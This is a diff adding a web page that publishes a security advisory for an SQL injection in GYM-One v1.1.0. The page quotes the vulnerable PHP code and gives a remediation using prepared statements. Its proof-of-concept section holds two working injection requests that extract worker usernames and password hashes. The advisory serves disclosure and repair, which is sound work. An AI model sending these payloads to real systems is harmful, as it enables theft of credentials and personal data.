@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-XXXX-XXXXX | SQL Injection in GYM-One v1.1.0 | Lennart Hostettler</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SQL Injection vulnerability in GYM-One v1.1.0 — admin/users/index.php. Discovered by Lennart Hostettler.">
+    <meta name="robots" content="index, follow">
+
+    <meta property="og:title" content="CVE-XXXX-XXXXX | SQL Injection in GYM-One v1.1.0">
+    <meta property="og:description" content="SQL Injection vulnerability in GYM-One v1.1.0 — admin/users/index.php. Discovered by Lennart Hostettler.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://hostettler.pro/posts/gymone-sqli.html">
+    <meta property="og:image" content="https://hostettler.pro/preview-image.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="CVE-XXXX-XXXXX | SQL Injection in GYM-One v1.1.0">
+    <meta name="twitter:description" content="SQL Injection vulnerability in GYM-One v1.1.0 — admin/users/index.php. Discovered by Lennart Hostettler.">
+    <meta name="twitter:image" content="https://hostettler.pro/preview-image.jpg">
+
+    <link rel="canonical" href="https://hostettler.pro/posts/gymone-sqli.html">
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        #menu ul {
+            list-style: none;
+
+            margin: 1em 0 0 0;
+            display: flex;
+            gap: 1.5em;
+        }
+        #menu a {
+            color: #00ff00;
+            font-weight: bold;
+            border-bottom: 2px solid;
+            transition: border-color 0.2s;
+        }
+        .meta-table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 1em 0 2em 0;
+        }
+        .meta-table td {
+            padding: 0.4em 0.8em;
+            border: 1px solid #33FF33;
+        }
+        .meta-table td:first-child {
+            color: #00FF00;
+            font-weight: bold;
+            white-space: nowrap;
+            width: 1%;
+        }
+        .severity-high {
+            color: #ff6600;
+            font-weight: bold;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2em;
+            color: #00FF00;
+            font-weight: bold;
+        }
+        pre code.hljs { background: #001a00; padding: 0; }
+        pre {
+            background-color: #001a00;
+            border: 1px solid #33FF33;
+            padding: 1em;
+            overflow-x: auto;
+            line-height: 1.4;
+        }
+        .post-date {
+            color: #33FF33;
+            font-size: 0.9em;
+            margin-bottom: 0.5em;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1 id="heading">lennart.hostettler@debian:~/posts</h1>
+        <nav id="menu">
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/publications.html">Publications</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <a href="/publications.html" class="back-link">&lt;-- Back to Publications</a>
+
+        <p class="post-date">12/06/2026 &mdash; Security Advisory</p>
+        <h2>CVE-XXXX-XXXXX &mdash; SQL Injection in GYM-One v1.1.0</h2>
+
+        <table class="meta-table">
+            <tr><td>Product</td><td>GYM-One</td></tr>
+            <tr><td>Version</td><td>v1.1.0</td></tr>
+            <tr><td>File</td><td><code>admin/users/index.php</code></td></tr>
+            <tr><td>CVE</td><td>CVE-XXXX-XXXXX (pending)</td></tr>
+            <tr><td>CWE</td><td>CWE-89 &mdash; Improper Neutralization of Special Elements used in SQL Command</td></tr>
+            <tr><td>CVSS 3.1 Vector</td><td>AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</td></tr>
+            <tr><td>CVSS Score</td><td><span class="severity-high">7.2 (High)</span></td></tr>
+            <tr><td>Auth Required</td><td>Yes (admin session)</td></tr>
+            <tr><td>Discovered by</td><td>Lennart Hostettler</td></tr>
+        </table>
+
+        <h2>Description</h2>
+        <p>
+            GYM-One v1.1.0 is vulnerable to SQL Injection in <code>admin/users/index.php</code>. The GET parameters
+            <code>search_name</code> and <code>search_email</code> are concatenated unsanitized into two separate SQL
+            queries without prepared statements or parameterization.
+        </p>
+
+        <p><strong>Vulnerable sink 1</strong> &mdash; Data query (line 103/106):</p>
+        <pre><code class="language-php">$conditions[] = "firstname LIKE '%$search_name%' OR lastname LIKE '%$search_name%'";
+$conditions[] = "email LIKE '%$search_email%'";
+// ...
+$result = $conn->query($sql); // line 113</code></pre>
+
+        <p><strong>Vulnerable sink 2</strong> &mdash; COUNT/pagination query (line 465/467):</p>
+        <pre><code class="language-php">$conditions[] = "firstname LIKE '%$search_name%' OR lastname LIKE '%$search_name%'";
+$conditions[] = "email LIKE '%$search_email%'";
+// ...
+$result = $conn->query($sql); // line 473</code></pre>
+
+        <h2>Proof of Concept</h2>
+
+        <h4>&gt; PoC 1 &mdash; UNION-based data exfiltration (Sink 1)</h4>
+        <p>Extracts all worker credentials from the <code>workers</code> table:</p>
+        <pre><code class="language-http">GET /admin/users/?search_email='UNION SELECT 1,username,password_hash,4,5,6,7,8,9,10,11,12,13,14,15 FROM workers-- -</code></pre>
+        <p>
+            <strong>Result:</strong> The <code>firstname</code> column in the user table renders the <code>username</code>
+            of each worker, <code>lastname</code> renders the <code>password_hash</code>.
+        </p>
+
+        <h4>&gt; PoC 2 &mdash; Error-based data exfiltration (Sink 2)</h4>
+        <p>
+            The COUNT query only returns a number, so UNION is not usable. Error-based injection leaks data via
+            MySQL's <code>extractvalue()</code>:
+        </p>
+        <pre><code class="language-http">GET /admin/users/?search_name=x' AND extractvalue(1,concat(0x7e,(SELECT password_hash FROM workers LIMIT 1)))-- -</code></pre>
+        <p>
+            <strong>Result:</strong> MySQL throws an XPath error containing the password hash of the first worker
+            account in the error message.
+        </p>
+
+        <h2>Impact</h2>
+        <p>An authenticated attacker with admin privileges can:</p>
+        <ul>
+            <li>Extract all data from any table in the <code>gymone</code> database (user PII, password hashes, tickets)</li>
+            <li>Potentially write files to the filesystem via <code>INTO OUTFILE</code> depending on DB permissions</li>
+        </ul>
+
+        <h2>Remediation</h2>
+        <p>Replace string concatenation with prepared statements using <code>bind_param()</code>:</p>
+        <pre><code class="language-php">$where = [];
+$bind_types = '';
+$bind_values = [];
+
+if (!empty($search_name)) {
+    $where[] = "(firstname LIKE ? OR lastname LIKE ?)";
+    $bind_types .= 'ss';
+    $bind_values[] = "%$search_name%";
+    $bind_values[] = "%$search_name%";
+}
+if (!empty($search_email)) {
+    $where[] = "email LIKE ?";
+    $bind_types .= 's';
+    $bind_values[] = "%$search_email%";
+}
+
+$sql = "SELECT * FROM users";
+if (!empty($where)) {
+    $sql .= " WHERE " . implode(" AND ", $where);
+}
+$sql .= " LIMIT ?, ?";
+$bind_types .= 'ii';
+$bind_values[] = $start_from;
+$bind_values[] = $per_page;
+
+$stmt = $conn->prepare($sql);
+$stmt->bind_param($bind_types, ...$bind_values);
+$stmt->execute();
+$result = $stmt->get_result();</code></pre>
+    </main>
+
+    <footer>
+        <p>Contact: <a href="mailto:lennart.hostettler@proton.me">💌 lennart.hostettler@proton.me</a></p>
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</body>
+</html>
